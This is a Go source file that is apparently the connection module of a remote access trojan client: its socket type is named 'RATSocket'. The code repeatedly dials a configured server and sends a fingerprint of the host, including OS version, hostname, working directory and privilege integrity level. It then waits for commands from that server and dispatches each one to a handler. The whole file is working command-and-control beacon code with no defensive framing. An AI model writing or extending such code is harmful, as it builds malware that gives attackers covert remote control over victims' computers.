package connection

import (
	"net"
	"os"
	"runtime"
	"time"

	"client-go/config"
	"client-go/executor"
	"client-go/handler"
	"client-go/protocol"
)

type Client struct {
	clientID string
}

func New() *Client {
	return &Client{clientID: executor.NewClientID()}
}

func (c *Client) Run() {
	for {
		conn, err := net.Dial("tcp", config.SERVER_ADDR)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}

		sock := protocol.NewRATSocket(conn)
		session := executor.NewSession(sock, c.clientID)

		_ = sock.Send(map[string]interface{}{
			"type":             "info",
			"id":               c.clientID,
			"os_type":          runtime.GOOS,
			"os_ver":           executor.DetectHandshakeOSVersion(),
			"go_version":       runtime.Version(),
			"hostname":         hostname(),
			"cwd":              session.Cwd,
			"integrity":        executor.DetectHandshakeIntegrity(),
			"build_version":    config.CLIENT_BUILD_VERSION,
			"command_manifest": executor.CommandManifest(),
			"system_paths":     []interface{}{},
		})

		for {
			msg, err := sock.Recv()
			if err != nil {
				_ = conn.Close()
				break
			}

			handler.Handle(session, msg)
		}
	}
}

func hostname() string {
	h, _ := os.Hostname()
	return h
}